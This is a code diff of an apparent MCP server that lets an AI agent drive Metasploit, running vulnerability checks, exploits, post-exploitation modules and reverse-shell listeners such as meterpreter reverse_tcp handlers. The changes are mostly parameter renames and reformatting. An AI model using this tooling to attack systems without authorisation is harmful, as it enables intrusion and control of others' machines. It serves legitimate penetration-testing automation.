-        logger.info(f"Performing vulnerability check first for {module_name}...")
+        logger.info(f"Performing vulnerability check first for {module}...")
         try:
-             # Use the console helper for 'check' as it provides output
-             # Pass exit terms regexes to return early when vulnerability status is determined
-             check_result = await _execute_module_console(
-                 module_type='exploit',
-                 module_name=module_name,
-                 module_options=parsed_options,
-                 command='check', # Use the 'check' command
-                 timeout=timeout_seconds,
-                 exit_terms_regexes=[IS_VULNERABLE_RE, IS_NOT_VULNERABLE_RE, FAILED_TO_LOAD_MODULE_RE, CHECK_NOT_SUPPORTED_RE]
-             )
-             logger.info(f"Vulnerability check result: {check_result.get('status')} - {check_result.get('message')}")
-             output = check_result.get("module_output", "")
-             output_bytes = output.encode('utf-8', errors='replace')
-             
-             # Check for module load failure first - this takes precedence
-             if FAILED_TO_LOAD_MODULE_RE.search(output_bytes):
-                 module_name_match = re.search(rb'Failed to load module:\s*([^\s\n]+)', output_bytes, re.IGNORECASE)
-                 failed_module = module_name_match.group(1).decode('utf-8', errors='replace') if module_name_match else module_name
-                 error_msg = f"Module '{failed_module}' failed to load during check. This typically means the module does not exist or failed to initialize."
-                 logger.error(f"Module load failure detected during check: {error_msg}")
-                 return {"status": "error", "message": error_msg, "check_output": output}
-             
-             # Check if module doesn't support the check command - proceed with exploit anyway
-             if CHECK_NOT_SUPPORTED_RE.search(output_bytes):
-                 logger.warning(f"Module '{module_name}' does not support check command. Proceeding with exploit attempt.")
-                 # Don't abort - just log and continue to exploit attempt
-             
-             output_lower = output.lower()
-             # Check output for positive indicators using global regex
-             is_vulnerable = bool(IS_VULNERABLE_RE.search(output_bytes))
-             # Check for negative indicators using global regex
-             is_not_vulnerable = bool(IS_NOT_VULNERABLE_RE.search(output_bytes))
-             if check_result.get('status') == "errror":
-                 logger.warning(f"Error from metasploit: {check_result}")
-                 return {"status": "aborted", "message": f"Check indicates a failure: {check_result.get('message')}", "check_output": check_result.get("module_output")}
+            # Use the console helper for 'check' as it provides output.
+            check_result = await _execute_module_console(
+                module_type='exploit',
+                module_name=module,
+                module_options=parsed_options,
+                command='check',
+                timeout=timeout_seconds,
+                exit_terms_regexes=[
+                    IS_VULNERABLE_RE,
+                    IS_NOT_VULNERABLE_RE,
+                    FAILED_TO_LOAD_MODULE_RE,
+                    CHECK_NOT_SUPPORTED_RE,
+                ],
+            )
+            logger.info(
+                f"Vulnerability check result: {check_result.get('status')} - {check_result.get('message')}"
+            )
+            output = check_result.get("module_output", "")
+            output_bytes = output.encode('utf-8', errors='replace')
 
-             if is_not_vulnerable or (not is_vulnerable and check_result.get("status") == "error"):
-                 logger.warning(f"Check indicates target is likely not vulnerable to {module_name}.")
-                 return {"status": "aborted", "message": f"Check indicates target not vulnerable. Exploit not attempted.", "check_output": check_result.get("module_output")}
-             elif not is_vulnerable:
-                 logger.warning(f"Check result inconclusive for {module_name}. Proceeding with exploit attempt cautiously.")
-             else:
-                 logger.info(f"Check indicates target appears vulnerable to {module_name}. Proceeding.")
-             # Optionally return check output here if needed by the agent
+            if FAILED_TO_LOAD_MODULE_RE.search(output_bytes):
+                module_name_match = re.search(
+                    rb'Failed to load module:\s*([^\s\n]+)',
+                    output_bytes,
+                    re.IGNORECASE,
+                )
+                failed_module = (
+                    module_name_match.group(1).decode('utf-8', errors='replace')
+                    if module_name_match
+                    else module
+                )
+                error_msg = (
+                    f"Module '{failed_module}' failed to load during check. "
+                    "This typically means the module does not exist or failed to initialize."
+                )
+                logger.error(f"Module load failure detected during check: {error_msg}")
+                return {"status": "error", "message": error_msg, "check_output": output}
+
+            if CHECK_NOT_SUPPORTED_RE.search(output_bytes):
+                logger.warning(
+                    f"Module '{module}' does not support check command. Proceeding with exploit attempt."
+                )
+
+            is_vulnerable = bool(IS_VULNERABLE_RE.search(output_bytes))
+            is_not_vulnerable = bool(IS_NOT_VULNERABLE_RE.search(output_bytes))
+            if check_result.get('status') == "errror":
+                logger.warning(f"Error from metasploit: {check_result}")
+                return {
+                    "status": "aborted",
+                    "message": f"Check indicates a failure: {check_result.get('message')}",
+                    "check_output": check_result.get("module_output"),
+                }
+
+            if is_not_vulnerable or (not is_vulnerable and check_result.get("status") == "error"):
+                logger.warning(f"Check indicates target is likely not vulnerable to {module}.")
+                return {
+                    "status": "aborted",
+                    "message": "Check indicates target not vulnerable. Exploit not attempted.",
+                    "check_output": check_result.get("module_output"),
+                }
+            if not is_vulnerable:
+                logger.warning(f"Check result inconclusive for {module}. Proceeding with exploit attempt cautiously.")
+            else:
+                logger.info(f"Check indicates target appears vulnerable to {module}. Proceeding.")
 
         except Exception as chk_e:
-             logger.warning(f"Vulnerability check failed for {module_name}: {chk_e}. Proceeding with exploit attempt.")
-             # Fall through to exploit attempt
+            logger.warning(f"Vulnerability check failed for {module}: {chk_e}. Proceeding with exploit attempt.")
+
         if payload_spec is None:
             # Just return the check result if no payload was provided
             return {
                 "status": "success",
-                "message": f"Check indicates target appears vulnerable to {module_name}.",
+                "message": f"Check indicates target appears vulnerable to {module}.",
                 "check_output": check_result.get("module_output")
             }
             
@@ -3154,13 +3199,13 @@ async def run_exploit(
         await ctx.report_progress(
             progress=0,
             total=100,
-            message=f"Starting exploit execution: {module_name}"
+            message=f"Starting exploit execution: {module}"
         )
     
     # Use keep-alive for long-running exploit execution
     keepalive = get_keepalive_manager(
         ctx,
-        operation_name=f"Exploit {module_name}",
+        operation_name=f"Exploit {module}",
         initial_progress=10,
         max_progress=90
     )
@@ -3169,18 +3214,18 @@ async def run_exploit(
         await keepalive.start()
         
         if run_as_job:
-            logger.info(f"Executing exploit '{module_name}' as background job via RPC")
+            logger.info(f"Executing exploit '{module}' as background job via RPC")
             result = await _execute_module_rpc(
                 module_type='exploit',
-                module_name=module_name,
+                module_name=module,
                 module_options=parsed_options,
                 payload_spec=payload_spec
             )
         else:
-            logger.info(f"Executing exploit '{module_name}' synchronously via console (timeout: {timeout_seconds}s)")
+            logger.info(f"Executing exploit '{module}' synchronously via console (timeout: {timeout_seconds}s)")
             result = await _execute_module_console(
                 module_type='exploit',
-                module_name=module_name,
+                module_name=module,
                 module_options=parsed_options,
                 command='exploit',
                 payload_spec=payload_spec,
@@ -3188,13 +3233,13 @@ async def run_exploit(
                 exit_terms_regexes=[SESSION_OPENED_RE, FAILED_TO_LOAD_MODULE_RE]  # Return early when session is opened or module fails to load
             )
     except InvalidModuleError as e:
-        logger.warning(f"Exploit module '{module_name}' not found: {e}")
+        logger.warning(f"Exploit module '{module}' not found: {e}")
         return {"status": "error", "message": str(e)}
     finally:
         await keepalive.stop(send_completion=False)
     
     exploit_duration = asyncio.get_event_loop().time() - exploit_start_time
-    logger.info(f"Exploit '{module_name}' execution completed in {exploit_duration:.1f}s with status: {result.get('status')}")
+    logger.info(f"Exploit '{module}' execution completed in {exploit_duration:.1f}s with status: {result.get('status')}")
     
     # Report completion if ctx available
     if ctx:
@@ -3207,13 +3252,13 @@ async def run_exploit(
     if payload_spec is None:
         result['extra_info'] = "No payload was provided, are you sure that's what you want?"
 
-    logger.info(f"Full outcome of exploit '{module_name}': {result}")
+    logger.info(f"Full outcome of exploit '{module}': {result}")
     
     return result
 
 @mcp.tool()
 async def run_post_module(
-    module_name: str,
+    module: str,
     session_id: int,
     options: Optional[Union[Dict[str, Any], str]] = None,
     run_as_job: bool = True,
@@ -3224,7 +3269,7 @@ async def run_post_module(
     Run a Metasploit post-exploitation module against a session.
 
     Args:
-        module_name: Name/path of the post module (e.g., 'windows/gather/enum_shares').
+        module: Name/path of the post module (e.g., 'windows/gather/enum_shares').
         session_id: The ID of the target session.
         options: Dictionary of module options (e.g., {'VERBOSE': True})
                 or string format "VERBOSE=true". 'SESSION' will be added automatically.
@@ -3240,26 +3285,26 @@ async def run_post_module(
         logger.warning(f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s")
         timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
     
-    logger.info(f"Request to run post module {module_name} on session {session_id}. Job: {run_as_job}")
+    logger.info(f"Request to run post module {module} on session {session_id}. Job: {run_as_job}")
     
     # Report initial progress if ctx available
     if ctx:
         await ctx.report_progress(
             progress=0,
             total=100,
-            message=f"Starting post module: {module_name}"
+            message=f"Starting post module: {module}"
         )
     
     # Validate module exists before proceeding
     try:
-        await _get_module_object('post', module_name)
-        logger.debug(f"Module '{module_name}' validated successfully")
+        await _get_module_object('post', module)
+        logger.debug(f"Module '{module}' validated successfully")
     except InvalidModuleError as e:
-        logger.warning(f"Post module '{module_name}' not found: {e}")
+        logger.warning(f"Post module '{module}' not found: {e}")
         return {"status": "error", "message": str(e)}
     except Exception as e:
-        logger.error(f"Error validating module '{module_name}': {e}")
-        return {"status": "error", "message": f"Error validating module '{module_name}': {e}"}
+        logger.error(f"Error validating module '{module}': {e}")
+        return {"status": "error", "message": f"Error validating module '{module}': {e}"}
     
     # Parse options gracefully (handles both dict and string formats)
     try:
@@ -3274,18 +3319,18 @@ async def run_post_module(
     try:
         current_sessions = await _list_sessions_str_keys(client)
         if str(session_id) not in current_sessions:
-             logger.error(f"Session {session_id} not found for post module {module_name}.")
-             return {"status": "error", "message": f"Session {session_id} not found.", "module": module_name}
+             logger.error(f"Session {session_id} not found for post module {module}.")
+             return {"status": "error", "message": f"Session {session_id} not found.", "module": module}
     except MsfRpcError as e:
         logger.error(f"Failed to validate session {session_id} before running post module: {e}")
         # Optionally proceed with caution or return error
-        return {"status": "error", "message": f"Error validating session {session_id}: {e}", "module": module_name}
+        return {"status": "error", "message": f"Error validating session {session_id}: {e}", "module": module}
 
 
     # Use keep-alive for potentially long-running post module execution
     keepalive = get_keepalive_manager(
         ctx,
-        operation_name=f"Post module {module_name}",
+        operation_name=f"Post module {module}",
         initial_progress=10,
         max_progress=90
     )
@@ -3296,14 +3341,14 @@ async def run_post_module(
         if run_as_job:
             result = await _execute_module_rpc(
                 module_type='post',
-                module_name=module_name,
+                module_name=module,
                 module_options=module_options
                 # No payload for post modules
             )
         else:
             result = await _execute_module_console(
                 module_type='post',
-                module_name=module_name,
+                module_name=module,
                 module_options=module_options,
                 command='run',
                 timeout=timeout_seconds,
@@ -3319,14 +3364,14 @@ async def run_post_module(
             )
         return result
     except InvalidModuleError as e:
-        logger.warning(f"Post module '{module_name}' not found: {e}")
+        logger.warning(f"Post module '{module}' not found: {e}")
         return {"status": "error", "message": str(e)}
     finally:
         await keepalive.stop(send_completion=False)
 
 @mcp.tool()
 async def run_auxiliary_module(
-    module_name: str,
+    module: str,
     options: Union[Dict[str, Any], str],
     run_as_job: bool = True, # Default False for scanners often makes sense
     timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT,
@@ -3336,7 +3381,7 @@ async def run_auxiliary_module(
     Run a Metasploit auxiliary module.
 
     Args:
-        module_name: Name/path of the auxiliary module (e.g., 'scanner/ssh/ssh_login').
+        module: Name/path of the auxiliary module (e.g., 'scanner/ssh/ssh_login').
         options: Dictionary of module options (e.g., {'RHOSTS': ..., 'USERNAME': ...})
                 or string format "RHOSTS=192.168.1.1,USERNAME=admin". Prefer dict format.
         run_as_job: If False, run sync via console. If True, run async via RPC.
@@ -3351,26 +3396,26 @@ async def run_auxiliary_module(
         logger.warning(f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s")
         timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
     
-    logger.info(f"Request to run auxiliary module {module_name}. Job: {run_as_job}")
+    logger.info(f"Request to run auxiliary module {module}. Job: {run_as_job}")
     
     # Report initial progress if ctx available
     if ctx:
         await ctx.report_progress(
             progress=0,
             total=100,
-            message=f"Starting auxiliary module: {module_name}"
+            message=f"Starting auxiliary module: {module}"
         )
     
     # Validate module exists before proceeding
     try:
-        await _get_module_object('auxiliary', module_name)
-        logger.debug(f"Module '{module_name}' validated successfully")
+        await _get_module_object('auxiliary', module)
+        logger.debug(f"Module '{module}' validated successfully")
     except InvalidModuleError as e:
-        logger.warning(f"Auxiliary module '{module_name}' not found: {e}")
+        logger.warning(f"Auxiliary module '{module}' not found: {e}")
         return {"status": "error", "message": str(e)}
     except Exception as e:
-        logger.error(f"Error validating module '{module_name}': {e}")
-        return {"status": "error", "message": f"Error validating module '{module_name}': {e}"}
+        logger.error(f"Error validating module '{module}': {e}")
+        return {"status": "error", "message": f"Error validating module '{module}': {e}"}
     
     # Parse options gracefully (handles both dict and string formats)
     try:
@@ -3381,7 +3426,7 @@ async def run_auxiliary_module(
     # Use keep-alive for potentially long-running auxiliary module execution
     keepalive = get_keepalive_manager(
         ctx,
-        operation_name=f"Auxiliary module {module_name}",
+        operation_name=f"Auxiliary module {module}",
         initial_progress=10,
         max_progress=90
     )
@@ -3392,14 +3437,14 @@ async def run_auxiliary_module(
         if run_as_job:
             result = await _execute_module_rpc(
                 module_type='auxiliary',
-                module_name=module_name,
+                module_name=module,
                 module_options=module_options
                 # No payload for aux modules
             )
         else:
             result = await _execute_module_console(
                 module_type='auxiliary',
-                module_name=module_name,
+                module_name=module,
                 module_options=module_options,
                 command='run',
                 timeout=timeout_seconds,
@@ -3415,7 +3460,7 @@ async def run_auxiliary_module(
             )
         return result
     except InvalidModuleError as e:
-        logger.warning(f"Auxiliary module '{module_name}' not found: {e}")
+        logger.warning(f"Auxiliary module '{module}' not found: {e}")
         return {"status": "error", "message": str(e)}
     finally:
         await keepalive.stop(send_completion=False)
@@ -3838,13 +3883,13 @@ async def list_listeners() -> Dict[str, Any]:
 
 @mcp.tool()
 async def start_listener(
-    payload_type: str,
+    payload: str,
     lhost: str,
     lport: int,
     additional_options: Optional[Union[Dict[str, Any], str]] = None,
     exit_on_session: bool = False, # Option to keep listener running
-    reverse_listener_bind_address: Optional[str] = None,
-    reverse_listener_bind_port: Optional[int] = None,
+    reverselistenerbindaddress: Optional[str] = None,
+    reverselistenerbindport: Optional[int] = None,
     ctx: Optional[Context] = None,
 ) -> Dict[str, Any]:
     """
@@ -3886,15 +3931,15 @@ async def start_listener(
         # CORRECT: Just use run_exploit() alone - it creates the listener automatically
 
     Args:
-        payload_type: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
+        payload: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
         lhost: Listener host address (what the target connects to).
         lport: Listener port (1-65535) (what the target connects to).
         additional_options: Optional dict of additional payload options (e.g., {"LURI": "/path"})
                            or string format "LURI=/path,HandlerSSLCert=cert.pem". Prefer dict format.
         exit_on_session: If True, handler exits after first session. If False (default), it keeps running.
-        reverse_listener_bind_address: Optional bind address for the handler (defaults to 0.0.0.0).
+        reverselistenerbindaddress: Optional bind address for the handler (defaults to 0.0.0.0).
                                       Use this when LHOST differs from the interface to bind to (e.g., NAT/firewall).
-        reverse_listener_bind_port: Optional bind port for the handler (defaults to LPORT).
+        reverselistenerbindport: Optional bind port for the handler (defaults to LPORT).
                                    Use this when LPORT differs from the port to bind to (e.g., port forwarding).
         ctx: MCP Context for progress reporting (optional, injected by FastMCP).
 
@@ -3902,16 +3947,16 @@ async def start_listener(
         Dictionary with handler status (job_id) or error details.
     """
     # Set defaults for bind address and port
-    bind_address = reverse_listener_bind_address if reverse_listener_bind_address is not None else "0.0.0.0"
-    bind_port = reverse_listener_bind_port if reverse_listener_bind_port is not None else lport
+    bind_address = reverselistenerbindaddress if reverselistenerbindaddress is not None else "0.0.0.0"
+    bind_port = reverselistenerbindport if reverselistenerbindport is not None else lport
     
-    logger.info(f"Request to start listener for {payload_type} on {lhost}:{lport}. "
+    logger.info(f"Request to start listener for {payload} on {lhost}:{lport}. "
                 f"Bind: {bind_address}:{bind_port}. ExitOnSession: {exit_on_session}")
 
     if not (1 <= lport <= 65535):
         return {"status": "error", "message": "Invalid LPORT. Must be between 1 and 65535."}
     
-    if reverse_listener_bind_port is not None and not (1 <= reverse_listener_bind_port <= 65535):
+    if reverselistenerbindport is not None and not (1 <= reverselistenerbindport <= 65535):
         return {"status": "error", "message": "Invalid ReverseListenerBindPort. Must be between 1 and 65535."}
     
     # Validate bind address (async to avoid blocking event loop on socket operations)
@@ -3944,20 +3989,20 @@ async def start_listener(
     if bind_port != lport:
         payload_options['ReverseListenerBindPort'] = bind_port
 
-    payload_spec = {"name": payload_type, "options": payload_options}
+    payload_spec = {"name": payload, "options": payload_options}
 
     # Report initial progress if ctx available
     if ctx:
         await ctx.report_progress(
             progress=0,
             total=100,
-            message=f"Starting listener: {payload_type} on {lhost}:{lport}"
+            message=f"Starting listener: {payload} on {lhost}:{lport}"
         )
     
     # Use keep-alive for listener startup
     keepalive = get_keepalive_manager(
         ctx,
-        operation_name=f"Start listener {payload_type}",
+        operation_name=f"Start listener {payload}",
         initial_progress=10,
         max_progress=90
     )
@@ -3973,7 +4018,7 @@ async def start_listener(
             payload_spec=payload_spec
         )
     except InvalidModuleError as e:
-        logger.warning(f"Payload '{payload_type}' not found for listener: {e}")
+        logger.warning(f"Payload '{payload}' not found for listener: {e}")
         return {"status": "error", "message": str(e)}
     finally:
         await keepalive.stop(send_completion=False)
@@ -3989,7 +4034,7 @@ async def start_listener(
     # Rename status/message slightly for clarity
     if result.get("status") == "success":
         bind_info = f" (binding to {bind_address}:{bind_port})" if (bind_address != lhost or bind_port != lport) else ""
-        result["message"] = f"Listener for {payload_type} started as job {result.get('job_id')} on {lhost}:{lport}{bind_info}."
+        result["message"] = f"Listener for {payload} started as job {result.get('job_id')} on {lhost}:{lport}{bind_info}."
     elif result.get("status") == "warning": # e.g., job started but polling failed (not applicable here but handle)
          result["message"] = f"Listener job {result.get('job_id')} started, but encountered issues: {result.get('message')}"
     else: # Error case
